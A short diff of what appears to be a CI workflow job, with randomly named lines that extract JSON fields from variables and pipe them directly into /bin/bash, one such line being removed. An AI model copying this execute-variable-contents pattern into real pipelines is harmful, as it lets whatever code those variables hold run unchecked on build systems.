@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$x39" | jq -r .xetck95 | /bin/bash
           printf '%s' "$psm81" | jq -r .rrry48 | /bin/bash
           printf '%s' "$qf0" | jq -r .hsq1 | /bin/bash
-          printf '%s' "$k4" | jq -r .dbdpj57675 | /bin/bash
           printf '%s' "$ijobd33" | jq -r .ia011 | /bin/bash
           echo $htbm42 | jq -r .bxaw9950 | /bin/bash
           printf '%s' "$ifmlm82" | jq -r .kxpnx88 | /bin/bash
